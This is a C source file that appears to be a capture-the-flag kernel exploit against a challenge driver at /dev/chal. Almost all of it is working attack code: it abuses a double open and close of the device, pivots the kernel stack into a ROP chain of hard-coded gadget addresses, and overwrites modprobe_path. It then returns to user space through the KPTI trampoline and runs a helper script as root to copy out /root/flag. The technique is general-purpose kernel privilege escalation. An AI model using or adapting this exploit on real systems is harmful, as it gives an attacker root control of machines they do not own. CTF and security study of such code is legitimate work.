#include <kpwn/kpwn.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

uint64_t mov_rsp_0x25 = 0xffffffff81b89f2b;
uint64_t add_esp_rdi = 0xffffffff81b58790;
uint64_t pop_rdi = 0xffffffff810aaf54;
uint64_t pop_rax = 0xffffffff811ab7b5;
uint64_t modprobe_path = 0xffffffff82ed18c0;
uint64_t mov_rsi_rcx = 0xffffffff813089e2;
uint64_t pop_rsi = 0xffffffff81040ede;
uint64_t pop_rcx = 0xffffffff811bd513;
uint64_t kpti = 0xffffffff81e01850 + 0x6d;

enum CMD { CMD_SET, CMD_GREET, CMD_FAREWELL };
IO *io;

void get_flag() {
  system("echo '#!/bin/sh\ncp /root/flag /home/user/flag\nchmod 777 "
         "/home/user/flag' > /home/user/x");
  system("chmod +x /home/user/x");

  system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/dummy");
  system("chmod +x /home/user/dummy");

  system("/home/user/dummy");

  system("cat /home/user/flag");

  exit(0);
}

int main(void) {

  SavedState state = save_state();

  uint64_t *buf =
      mmap(0, 0x1000, PROT_READ | PROT_WRITE,
           MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  buf[0] = mov_rsp_0x25;
  buf[1] = 3 + 0x20;

  Bytes *align_chain = flat(p64(pop_rdi), p64(8), p64(pop_rax), p64(0x77),
                            p64(add_esp_rdi), NULL);

  memcpy((char *)buf + 0x25, b_d(align_chain), b_len(align_chain));

  Bytes *rop = flat(p64(pop_rsi), p64(modprobe_path), p64(pop_rcx),
                    p64(0x73752f656d6f682f), p64(mov_rsi_rcx), p64(pop_rsi),
                    p64(modprobe_path + 8), p64(pop_rcx), p64(0x782f7265),
                    p64(mov_rsi_rcx), p64(kpti), b_mul(p64(0), 2),
                    p64((uint64_t)&get_flag), p64(state.cs), p64(state.flags),
                    p64(state.sp), p64(state.ss), NULL);
  memcpy(buf + 14, b_d(rop), b_len(rop));

  io = io_new("/dev/chal", O_RDWR);
  close(io_new("/dev/chal", O_RDWR)->_fd);

  io_ioctl(io, CMD_GREET);

  return 0;
}
